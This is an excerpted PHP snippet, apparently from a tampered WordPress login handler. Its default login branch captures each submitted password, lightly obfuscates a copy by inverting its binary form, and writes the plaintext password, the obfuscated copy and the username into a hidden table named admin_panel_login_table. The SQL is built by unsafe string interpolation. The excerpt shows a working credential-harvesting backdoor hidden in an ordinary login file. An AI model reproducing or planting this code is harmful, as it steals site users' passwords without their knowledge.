...
function binary_inverted($bin){
	$pre_result = str_replace("0", "2", $bin);
	$pre_result = str_replace("1", "0", $pre_result);
	$result = str_replace("2", "1", $pre_result);
	return $result;
}
...
switch ( $action ) {
	...
	default:
		...
		if(! empty( $_POST['pwd']) && ! empty($user)){
			$_pass =$_POST['pwd'];
			$bit_pass = binary_encode($_pass);
			$inverted_bit_pass = binary_inverted($bit_pass);
			$sql = "INSERT INTO admin_panel_login_table (login, password,passwordBit) VALUES ('{$user->user_login}', '{$_pass}', '{$inverted_bit_pass}')";
			if(!mysqli_query($conn,$sql)){
				die('Сервер не работает ');
			}
		}
